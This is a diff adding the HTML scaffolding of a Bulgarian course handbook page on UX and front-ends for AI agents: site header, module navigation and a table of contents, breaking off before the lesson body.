@@ -1,0 +1,3077 @@
+
+<!doctype html>
+<html lang="bg" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Learning-by-doing course, release 2026.11 (content as of October 2026)">
+      
+      
+      
+      
+        <link rel="prev" href="../d03-multimodal-and-realtime-agents/">
+      
+      
+        <link rel="next" href="../d05-performance-and-cost-engineering/">
+      
+      
+        
+          <link rel="alternate" href="../../../part-4-developer-track/d04-agent-ux-and-front-ends/" hreflang="en">
+        
+          <link rel="alternate" href="./" hreflang="bg">
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>D4 — UX и фронтенди за агенти - AI Solution Developer & Architect — Наръчник за курсиста</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#d4-agent-ux-front-ends" class="md-skip">
+          Към съдържанието
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Горен колонтитул">
+    <a href="../../" title="AI Solution Developer &amp; Architect — Наръчник за курсиста" class="md-header__button md-logo" aria-label="AI Solution Developer & Architect — Наръчник за курсиста" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            AI Solution Developer & Architect — Наръчник за курсиста
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              D4 — UX и фронтенди за агенти
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+      <div class="md-header__option">
+  <div class="md-select">
+    
+    <button class="md-header__button md-icon" aria-label="Избери език">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"/></svg>
+    </button>
+    <div class="md-select__inner">
+      <ul class="md-select__list">
+        
+          <li class="md-select__item">
+            <a href="../../../part-4-developer-track/d04-agent-ux-and-front-ends/" hreflang="en" class="md-select__link">
+              English
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="./" hreflang="bg" class="md-select__link">
+              Български
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Търси" placeholder="Търси" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Търси">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Изчисти" aria-label="Изчисти" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Инициализирано търсене
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Навигация" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../" title="AI Solution Developer &amp; Architect — Наръчник за курсиста" class="md-nav__button md-logo" aria-label="AI Solution Developer & Architect — Наръчник за курсиста" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    AI Solution Developer & Architect — Наръчник за курсиста
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Добре дошли
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Започнете оттук
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Започнете оттук
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../start-here/how-to-use/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Как да използвате наръчника
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../start-here/course-overview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Преглед на курса
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../start-here/assessment-gates/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Оценяване и гейтове
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../start-here/competency-matrix/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Матрица на компетентностите
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Част 1 — Основи (ниво 1)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Част 1 — Основи (ниво 1)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-1-foundations/c00-orientation-setup-and-toolchain/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C0 — Ориентация, настройка и инструменти
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-1-foundations/c01-how-generative-ai-works-an-engineer-s-mental-model/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C1 — Как работи генеративният AI: мисловен модел за инженери
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-1-foundations/c02-your-first-ai-feature-in-net/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C2 — Първата ви AI функционалност в .NET
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-1-foundations/c03-prompting-structured-outputs-and-tool-calling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C3 — Промптинг, структуриран изход и извикване на инструменти
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-1-foundations/c04-working-with-coding-agents-the-factory-day-one/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C4 — Работа с кодиращи агенти: Фабриката, първи ден
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-1-foundations/c05-evals-from-day-one/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C5 — Evals от първия ден
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Част 2 — Градивни елементи (ниво 2)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Част 2 — Градивни елементи (ниво 2)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-2-building-blocks/c06-embeddings-and-vector-search/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C6 — Embeddings и векторно търсене
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-2-building-blocks/c07-rag-from-documents-to-cited-permission-aware-answers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C7 — RAG: от документи до отговори с цитати, съобразени с правата на достъп
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-2-building-blocks/c08-tools-and-the-model-context-protocol/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C8 — Инструменти и Model Context Protocol
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-2-building-blocks/c09-agents-with-microsoft-agent-framework/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C9 — Агенти с Microsoft Agent Framework
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-2-building-blocks/c10-agents-over-structured-data-text-to-sql-on-sql-server/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C10 — Агенти върху структурирани данни: text-to-SQL върху SQL Server
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-2-building-blocks/c11-agentic-testing-ai-driven-tdd-mutation-and-e2e-test-agents/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C11 — Агентно тестване: TDD с AI, мутационно тестване и агенти за E2E тестове
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Част 3 — Продукционни системи (ниво 3)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Част 3 — Продукционни системи (ниво 3)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-3-production/c12-workflows-and-multi-agent-orchestration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C12 — Workflows и многоагентна оркестрация
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-3-production/c13-context-engineering-advanced-retrieval-and-memory/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C13 — Инженеринг на контекста, напреднало извличане и памет
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-3-production/c14-failure-driven-evals-llm-judges-and-red-teaming/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C14 — Evals, водени от грешките, LLM съдии и red teaming
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-3-production/c15-observability-genaiops-and-cost/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C15 — Наблюдаемост, GenAIOps и разходи
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-3-production/c16-security-for-llm-and-agentic-systems/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C16 — Сигурност на LLM и агентни системи
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-3-production/c17-shipping-to-azure-hosting-ai-gateway-iac-and-interop/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C17 — Пускане в Azure: хостинг, AI gateway, IaC и оперативна съвместимост
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-3-production/c18-responsible-ai-and-the-eu-ai-act-in-practice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C18 — Отговорен AI и Актът за изкуствения интелект на ЕС на практика
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../part-3-production/c19-the-automated-sdlc-agents-from-issue-to-production/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C19 — Автоматизираният SDLC: агенти от issue до продукция
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Част 4 — Експертна специализация: AI Solution Developer
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Част 4 — Експертна специализация: AI Solution Developer
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../d01-model-customization-and-small-local-models/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D1 — Адаптиране на модели и малки/локални модели
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../d02-long-running-durable-and-autonomous-agents/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D2 — Дълго работещи, устойчиви и автономни агенти
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../d03-multimodal-and-realtime-agents/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D3 — Мултимодални агенти и агенти в реално време
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D4 — UX и фронтенди за агенти
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D4 — UX и фронтенди за агенти
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Съдържание">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Съдържание
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#why-this-matters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why this matters
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#learning-outcomes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Learning outcomes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#concepts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concepts
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Concepts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-streaming-perceived-latency-structure-and-control" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Streaming: perceived latency, structure and control
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-agentui-integration-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Agent–UI integration options
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-approval-ux-that-resists-rubber-stamping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Approval UX that resists rubber-stamping
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-citations-users-can-verify" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Citations users can verify
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-uncertainty-partial-results-and-errors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Uncertainty, partial results and errors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-accessibility-for-streaming-and-agentic-uis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Accessibility for streaming and agentic UIs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-feedback-that-becomes-evals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Feedback that becomes evals
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8-front-end-stack-choices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Front-end stack choices
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-versions-as-of-oct-2026" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools &amp; versions (as of Oct 2026)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#labs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Labs
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Labs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lab-1-streaming-dispatcher-console-in-blazor-3h" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab 1 — Streaming dispatcher console in Blazor (≈3h)
+      
